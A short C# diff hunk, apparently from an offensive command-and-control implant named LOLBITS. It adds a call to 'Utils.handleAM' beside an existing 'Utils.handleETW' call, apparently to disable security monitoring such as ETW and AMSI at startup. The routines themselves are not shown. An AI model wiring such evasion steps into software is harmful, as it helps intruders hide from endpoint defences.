@@ -63,6 +63,8 @@ namespace LOLBITS.Controlling
             _jobsManager.Send(_id, filePath);
 
             Utils.handleETW(_sysCall);
+            Utils.handleAM(_sysCall);
+
 
             Loop();
                 
